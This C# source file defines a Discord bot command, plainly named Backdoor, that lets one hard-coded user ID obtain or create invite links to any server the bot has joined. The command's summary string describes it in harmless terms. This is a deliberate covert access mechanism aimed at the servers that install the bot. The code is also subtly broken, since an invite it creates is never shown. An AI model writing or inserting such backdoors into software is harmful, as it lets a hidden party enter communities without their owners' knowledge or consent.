using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace NFH_Bot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("Backdoor"), Alias("backdoor"), Summary("ServerInviteGetCommand")]
        public async Task BackdoorModule(ulong GuildId)
        {
            if (!(Context.User.Id == 168071466137419777))
            {
                await Context.Channel.SendMessageAsync(":x: !Error! - You are not a bot moderator!");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: !Error! - I am not in a guild with ID =" + GuildId);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
                var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count() < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync($":x: !Error! - Creating an invite for guild {Guild.Name} went wrong with error: ``{ex.Message}``");
                    return;
                }

            }

                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invites for guild {Guild.Name}:", Context.User.GetAvatarUrl());
                Embed.WithColor(255, 223, 0);
                Embed.WithCurrentTimestamp();
                foreach (var Current in Invites)
                    Embed.AddInlineField("Invites:", $"[Invite]({Current.Url})");

            await Context.Channel.SendMessageAsync("", false, Embed.Build());
        }
    }
}
